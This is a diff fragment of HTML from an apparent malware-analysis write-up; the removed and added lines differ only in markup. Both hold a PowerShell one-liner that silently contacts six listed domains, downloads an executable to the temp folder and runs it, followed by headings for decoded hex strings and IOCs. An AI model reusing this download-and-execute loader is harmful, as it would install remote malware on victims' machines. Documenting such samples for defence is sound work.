-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$ErrorActionPreference=<span style="color:#e6db74">&#39;SilentlyContinue&#39;</span>;@(<span style="color:#e6db74">&#34;https://web.sunvn.net&#34;</span>,<span style="color:#e6db74">&#34;https://taisunwin.club&#34;</span>,<span style="color:#e6db74">&#34;https://web.sunwinvn.vip&#34;</span>,<span style="color:#e6db74">&#34;http://b29.bet&#34;</span>,<span style="color:#e6db74">&#34;https://playgo88.fun&#34;</span>,<span style="color:#e6db74">&#34;https://choigo88.us&#34;</span>)|%{$http=<span style="color:#66d9ef">[System.Net.WebRequest]</span>::Create(<span style="color:#e6db74">&#34;$_/SoftwareUpdate.exe&#34;</span>).GetResponse();<span style="color:#66d9ef">if</span>($http.ContentLength <span style="color:#f92672">-ne</span> -1){(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#34;$_/update.exe&#34;</span>,<span style="color:#e6db74">&#34;$env:temp\update.exe&#34;</span>);Start-Process -Filepath <span style="color:#e6db74">&#34;$env:temp\update.exe&#34;</span>};$http.close()}
-</code></pre></div><h3 id="table-including-decoded-hex-strings">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ErrorActionPreference=<span style="color:#e6db74">&#39;SilentlyContinue&#39;</span>;@(<span style="color:#e6db74">&#34;https://web.sunvn.net&#34;</span>,<span style="color:#e6db74">&#34;https://taisunwin.club&#34;</span>,<span style="color:#e6db74">&#34;https://web.sunwinvn.vip&#34;</span>,<span style="color:#e6db74">&#34;http://b29.bet&#34;</span>,<span style="color:#e6db74">&#34;https://playgo88.fun&#34;</span>,<span style="color:#e6db74">&#34;https://choigo88.us&#34;</span>)|%{$http=[<span style="color:#66d9ef">System.Net.WebRequest</span>]::Create(<span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74">/SoftwareUpdate.exe&#34;</span>).GetResponse();<span style="color:#66d9ef">if</span>($http.ContentLength <span style="color:#f92672">-ne</span> <span style="color:#ae81ff">-1</span>){(New-Object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74">/update.exe&#34;</span>,<span style="color:#e6db74">&#34;</span>$env:temp<span style="color:#e6db74">\update.exe&#34;</span>);Start-Process -Filepath <span style="color:#e6db74">&#34;</span>$env:temp<span style="color:#e6db74">\update.exe&#34;</span>};$http.close()}
+</span></span></code></pre></div><h3 id="table-including-decoded-hex-strings">
   Table including decoded hex strings
   <a href="#table-including-decoded-hex-strings" class="h-anchor" aria-hidden="true">#</a>
 </h3>
-<p><img src="/Minskdoc/Untitled%204.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Minskdoc/Untitled%204.png"></p>
 <h1 id="iocs">
   IOCs
   <a href="#iocs" class="h-anchor" aria-hidden="true">#</a>
